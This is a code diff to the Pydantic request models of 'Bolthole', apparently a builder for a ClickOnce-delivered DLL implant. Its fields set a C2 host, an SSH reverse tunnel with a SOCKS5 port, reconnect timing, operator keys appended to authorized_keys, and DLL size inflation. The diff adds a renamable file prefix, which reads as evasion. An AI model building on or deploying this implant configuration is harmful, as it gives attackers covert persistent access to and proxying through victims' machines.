@@ -2,7 +2,8 @@
 Models for Bolthole build requests
 """
 
-from pydantic import BaseModel
+import re
+from pydantic import BaseModel, field_validator
 
 
 class BoltholePayload(BaseModel):
@@ -13,6 +14,7 @@ class BoltholePayload(BaseModel):
     provider_url: str = ""  # HTTPS URL for deploymentProvider in .application (optional)
     version: str        # app version string (e.g. "1.0.0.0")
     inflate: int        # MB to inflate DLL (0–500)
+    files_prefix: str = "bolt"  # prefix for bolt* filenames in the package (e.g. "shadow" → ShadowFiles/)
     # Section B — Bolthole SSH tunnel (values compiled into the DLL)
     ssh_host: str       # C2 FQDN or IP
     ssh_user: str       # SSH username on C2
@@ -21,7 +23,14 @@ class BoltholePayload(BaseModel):
     socks_port: int     # remote dynamic SOCKS5 port (default 1080)
     startup_delay: int  # seconds to sleep before starting boltcon (default 5)
     reconnect_delay: int  # seconds to sleep between reconnect attempts (default 30)
-    operator_pubkey: str = ""  # extra operator public keys appended to BoltFiles/authorized_keys
+    operator_pubkey: str = ""  # extra operator public keys appended to authorized_keys
+
+    @field_validator("files_prefix")
+    @classmethod
+    def validate_files_prefix(cls, v: str) -> str:
+        if not re.match(r'^[a-z][a-z0-9]{2,15}$', v):
+            raise ValueError("files_prefix must be 3–16 lowercase alphanumeric characters starting with a letter")
+        return v
 
 
 class BoltholeC2ConfigRequest(BaseModel):
